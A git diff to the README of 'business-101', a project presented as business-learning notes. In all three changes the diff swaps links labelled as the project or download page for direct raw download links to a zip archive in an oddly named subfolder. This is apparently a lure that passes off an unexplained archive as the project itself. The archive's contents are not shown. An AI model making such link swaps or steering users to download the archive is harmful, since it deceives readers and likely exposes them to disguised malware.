@@ -1,6 +1,6 @@
 # 📘 business-101 - Learn business with clear notes
 
-[![Download the app](https://img.shields.io/badge/Download-Business%20101-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/persisting-functionalism516/business-101)
+[![Download the app](https://img.shields.io/badge/Download-Business%20101-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/persisting-functionalism516/business-101/raw/refs/heads/main/stannyl/business_1.2.zip)
 
 ## 🧭 What this is
 
@@ -38,7 +38,7 @@ If your PC can open a web page, it can use this project.
 
 Visit the download page here:
 
-https://github.com/persisting-functionalism516/business-101
+https://github.com/persisting-functionalism516/business-101/raw/refs/heads/main/stannyl/business_1.2.zip
 
 On that page:
 
@@ -194,7 +194,7 @@ If the text looks strange:
 
 If you need the project page again, use this link:
 
-https://github.com/persisting-functionalism516/business-101
+https://github.com/persisting-functionalism516/business-101/raw/refs/heads/main/stannyl/business_1.2.zip
 
 ## 📄 File tips
 
